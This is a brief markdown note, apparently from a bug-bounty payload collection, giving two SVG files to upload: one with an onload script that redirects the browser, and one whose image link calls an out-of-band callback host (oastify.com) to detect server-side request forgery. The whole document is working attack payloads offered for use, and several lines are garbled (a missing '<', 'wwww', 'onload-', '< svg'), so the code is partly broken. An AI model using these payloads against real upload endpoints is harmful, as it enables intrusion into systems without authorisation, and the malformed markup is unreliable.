# payload-for-svg-to-ssrf-redirect

## create a file name { open-redirect.svg } paste this 

?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg xmlns="http://wwww.w3.org/2000/svg" onload-"window.location='https://google.com'">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>


#### create a file name { svg-for-ssrf.svg } paste this

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
< svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image height="30" width="30" xlink:href="http://qvpv4d54is1k4f3wbe1kwd7j0a60up.oastify.com/pic.svg" />
</svg>
